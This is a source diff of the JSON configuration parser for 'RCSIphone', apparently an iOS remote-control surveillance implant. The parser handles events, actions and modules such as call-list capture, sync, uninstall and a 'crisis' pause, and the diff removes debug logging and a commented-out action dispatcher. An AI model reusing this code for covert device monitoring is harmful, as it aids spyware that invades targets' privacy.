@@ -3,7 +3,7 @@
 //  RCSIphone
 //
 //  Created by kiodo on 23/02/12.
-//  Copyright 2012 __MyCompanyName__. All rights reserved.
+//  Copyright 2012 HT srl. All rights reserved.
 //
 
 #import "SBJSon.h"
@@ -25,9 +25,9 @@
     parser = [[SBJsonStreamParser alloc] init];
     parser.delegate = adapter;
     
-//    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
-//    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
-//    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
+    mEventsList  = [[NSMutableArray alloc] initWithCapacity:0];
+    mActionsList = [[NSMutableArray alloc] initWithCapacity:0];
+    mAgentsList  = [[NSMutableArray alloc] initWithCapacity:0];
   }
   
   return self;
@@ -35,163 +35,13 @@
 
 - (void)dealloc
 {
-//  [mEventsList release];
-//  [mAgentsList release];
-//  [mActionsList release];
+  [mEventsList release];
+  [mAgentsList release];
+  [mActionsList release];
   
   [parser release];
   [adapter release];
   [super dealloc];
-}
-
-// will be inserted in taskmanager category... move it there after impls
-- (BOOL)triggerAction: (int)anAction
-{
-#ifdef DEBUG
-  NSLog(@"Triggering Action: %d", anAction);
-#endif
-  
-  NSDictionary *action = (NSDictionary *)[mActionsList objectAtIndex: anAction];
-  
-  if (action == nil)
-    {
-#ifdef DEBUG_JSON_CONFIG
-    NSLog(@"%s: no action dictionary", __FUNCTION__);
-#endif    
-    return NO;
-    }
-  
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: action dictionary %@", __FUNCTION__, action);
-#endif
-  
-  NSArray *subactArray = (NSArray *)[action objectForKey: ACTION_SUBACT_KEY];
-  
-  for (int subAct=0; subAct < [subactArray count]; subAct++) 
-    {  
-      //    switch ([[configuration objectForKey: @"type"] intValue])
-      //    {
-      //#if 0
-      //      case ACTION_SYNC_APN:
-      //      {
-      //#ifdef DEBUG_JSON_CONFIG
-      //        NSLog(@"Starting action Sync APN");
-      //#endif
-      //        
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          if (gAgentCrisis == NO) 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
-      //#endif
-      //            NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //            [configuration setObject: status forKey: @"status"];
-      //            
-      //            [mActions actionSyncAPN: configuration];
-      //          }
-      //          else 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
-      //#endif
-      //          }
-      //        }
-      //        break;
-      //      }
-      //#endif
-      //      case ACTION_SYNC:
-      //      {
-      //#ifdef DEBUG_JSON_CONFIG
-      //        NSLog(@"Starting action Sync");
-      //#endif
-      //        
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          if (gAgentCrisis == NO) 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent not active sync!", __FUNCTION__);
-      //#endif
-      //            NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //            [configuration setObject: status forKey: @"status"];
-      //            
-      //            [mActions actionSync: configuration];
-      //          }
-      //          else 
-      //          {
-      //#ifdef DEBUG_JSON_CONFIG
-      //            NSLog(@"%s: crisis agent active don't sync!", __FUNCTION__);
-      //#endif
-      //          }
-      //        }
-      //        break;
-      //      }
-      //      case ACTION_AGENT_START:
-      //      {
-      //        // Maybe call directly startAgent form TaskManager here instead of passing
-      //        // through RCSMActions
-      //        
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //#ifdef DEBUG_JSON_CONFIG
-      //          NSLog(@"AGENT START");
-      //#endif
-      //          
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionAgent: configuration start: TRUE];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      case ACTION_AGENT_STOP:
-      //      {
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionAgent: configuration start: FALSE];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      case ACTION_UNINSTALL:
-      //      {
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionUninstall: configuration];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      case ACTION_INFO:
-      //      {
-      //#ifdef DEBUG_JSON_CONFIG
-      //        NSLog(@"Starting info action");
-      //#endif
-      //        if ([[configuration objectForKey: @"status"] intValue] == 0)
-      //        {
-      //          NSNumber *status = [NSNumber numberWithUnsignedInt: 1];
-      //          [configuration setObject: status forKey: @"status"];
-      //          
-      //          [mActions actionInfo: configuration];
-      //          status = [NSNumber numberWithUnsignedInt: 0];
-      //          [configuration setObject: status forKey: @"status"];
-      //        }
-      //        
-      //        break;
-      //      }
-      //      default:
-      //        return FALSE;
-      //    }
-    }
-  return TRUE;
 }
 
 #
@@ -262,10 +112,13 @@
                                     @"status",
                                     @"data",
                                     nil];
+  u_int list = [applist boolValue];
+  
+  NSData *data = [NSData dataWithBytes:&list length:sizeof(list)];
   
   objects = [NSArray arrayWithObjects: type, 
                                        enabled, 
-                                       (applist != nil ? (id)applist : (id)MODULE_EMPTY_CONF),
+                                       data,
                                        nil];
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
@@ -824,10 +677,7 @@ typedef struct _message_config_t {
   
   if (modulesArray == nil) 
     {
-#ifdef DEBUG_JSON_CONFIG
-    NSLog(@"%s: no modulesArray found", __FUNCTION__);
-#endif
-    return;
+      return;
     }
   
   for (int i=0; i < [modulesArray count]; i++) 
@@ -848,7 +698,7 @@ typedef struct _message_config_t {
         {
         [self initDeviceModule: module];
         }
-      else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
+      else if ([moduleType compare: MODULES_CALL_KEY] == NSOrderedSame) 
         {
         [self initCalllistModule: module];
         }
@@ -1379,10 +1229,6 @@ typedef struct _message_config_t {
   NSData  *data;
   connectionStruct_t conStruct;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering event type %@", __FUNCTION__, [anEvent objectForKey: @"desc"]);
-#endif
-  
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
@@ -1402,30 +1248,30 @@ typedef struct _message_config_t {
   data = [NSData dataWithBytes: &conStruct length: sizeof(conStruct)];
   
   keys = [NSArray arrayWithObjects: @"type", 
-          @"actionID", 
-          @"data",
-          @"status", 
-          @"monitor", 
-          @"enabled",
-          @"start",
-          @"repeat",
-          @"delay",
-          @"iter",
-          @"end",
-          nil];
+                                    @"actionID", 
+                                    @"data",
+                                    @"status", 
+                                    @"monitor", 
+                                    @"enabled",
+                                    @"start",
+                                    @"repeat",
+                                    @"delay",
+                                    @"iter",
+                                    @"end",
+                                    nil];
   
   objects = [NSArray arrayWithObjects: type, 
-             action  != nil ? action  : defNum, 
-             data,
-             EVENT_START, 
-             @"", 
-             enabled != nil ? enabled : defNum,
-             action  != nil ? action  : defNum,
-             repeat  != nil ? repeat  : defNum,
-             delay   != nil ? delay   : defNum,
-             iter    != nil ? iter    : defNum,
-             end     != nil ? end     : defNum,
-             nil]; 
+                                       action  != nil ? action  : defNum, 
+                                       data,
+                                       EVENT_START, 
+                                       @"", 
+                                       enabled != nil ? enabled : defNum,
+                                       action  != nil ? action  : defNum,
+                                       repeat  != nil ? repeat  : defNum,
+                                       delay   != nil ? delay   : defNum,
+                                       iter    != nil ? iter    : defNum,
+                                       end     != nil ? end     : defNum,
+                                       nil]; 
   
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
@@ -1737,6 +1583,8 @@ typedef struct _message_config_t {
   
   NSMutableDictionary *subActDict = [[NSMutableDictionary alloc] initWithObjectsAndKeys: 
                                       type, @"type", status, @"status", data, @"data", nil];
+  
+  [data release];
   
   [pool release];
   
@@ -2082,92 +1930,78 @@ typedef struct _message_config_t {
 
 - (void)parser:(SBJsonStreamParser *)parser foundObject:(NSDictionary *)dict 
 {
-#ifdef DEBUG_JSON_CONFIG
-	NSLog(@"%s: found dictionary", __FUNCTION__);
-#endif
-  
-  // running the parsers
   [self parseAndAddActions: dict];
-
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: found actions dict %@", __FUNCTION__, dict);
-  NSLog(@"%s: actions array %@", __FUNCTION__, mActionsList);
-#endif
 
   [self parseAndAddEvents: dict];
    
   [self parseAndAddModules: dict];
   
-#ifdef DEBUG_JSON_CONFIG
-  id tmpArray = [dict objectForKey: EVENTS_KEY];
-  NSLog(@"%s: found events dict %@", __FUNCTION__, tmpArray);
-  NSLog(@"%s: events array %@", __FUNCTION__, mEventsList);
-#endif
 }
 
-#define FILE_CONFIG @"/tmp/config"
-
-- (BOOL)runParser:(NSData*)dataConfig
+- (BOOL)checkConfiguration:(NSData*)dataConfig
 {
-//  NSData *dataConfig = [NSData dataWithContentsOfFile: FILE_CONFIG];
-  
-  if (dataConfig == nil) {
-#ifdef DEBUG_JSON_CONFIG    
-    NSLog(@"%s: no configuration file...", __FUNCTION__);
-#endif
+  if (dataConfig == nil)
     return NO;
-  }
   
   SBJsonStreamParserStatus status = [parser parse: dataConfig];
-
-#ifdef DEBUG_JSON_CONFIG  
-  NSLog(@"%s: parser runned: %d", __FUNCTION__,  status);
-#endif
   
 	if (status == SBJsonStreamParserError) 
-    {
-#ifdef DEBUG_JSON_CONFIG    
-      NSLog(@"%s: Parser error: %@", __FUNCTION__, parser.error);
-#endif
-      return NO;
-    } 
+    return NO;
   else if (status == SBJsonStreamParserWaitingForData) 
-    {
-#ifdef DEBUG_JSON_CONFIG
-      NSLog(@"%s: Parser waiting for more data", __FUNCTION__);
-#endif
-      return NO;
-    }
+    return NO;
   else if (status == SBJsonStreamParserComplete) 
-    {
-#ifdef DEBUG_JSON_CONFIG    
-      NSLog(@"%s: parsing correctly!", __FUNCTION__);
-#endif
-      return YES;
-    }
+    return YES;
   
   return YES;
 }
 
+- (BOOL)runParser:(NSData*)dataConfig
+{
+  if (dataConfig == nil)
+    return NO;
+  
+  SBJsonStreamParserStatus status = [parser parse: dataConfig];
 
-- (BOOL)runParser:(NSData*)aConfiguration
-       WithEvents:(NSMutableArray*)eventsArray
-       andActions:(NSMutableArray*)actionsArray
-       andModules:(NSMutableArray*)modulesArray
+	if (status == SBJsonStreamParserError) 
+      return NO;
+  else if (status == SBJsonStreamParserWaitingForData) 
+      return NO;
+  else if (status == SBJsonStreamParserComplete) 
+      return YES;
+  
+  return YES;
+}
+
+- (NSMutableArray*)getEventsFromConfiguration:(NSData*)aConfiguration
+{
+  if ([self run: aConfiguration] == YES) 
+    return mEventsList;
+  else
+    return nil;
+}
+
+
+- (NSMutableArray*)getActionsFromConfiguration:(NSData*)aConfiguration
+{
+  if ([self run: aConfiguration] == YES) 
+    return mActionsList;
+  else
+    return nil;
+}
+
+- (NSMutableArray*)getAgentsFromConfiguration:(NSData*)aConfiguration
+{
+  if ([self run: aConfiguration] == YES) 
+    return mAgentsList;
+  else
+    return nil;
+}
+
+- (BOOL)run:(NSData*)aConfiguration
 {
   NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
   
   BOOL bRet = FALSE;
-  
-//  SBJSonConfigDelegate *myJSon = [[SBJSonConfigDelegate alloc] init];
-//  
-//  [myJSon runParser];
-//  
-//  [myJSon release];
-  
-  mEventsList = eventsArray;
-  mActionsList = actionsArray;
-  mAgentsList = modulesArray;
   
   bRet = [self runParser: aConfiguration];
   
@@ -2175,6 +2009,5 @@ typedef struct _message_config_t {
   
   return  bRet;
 }
-
 
 @end
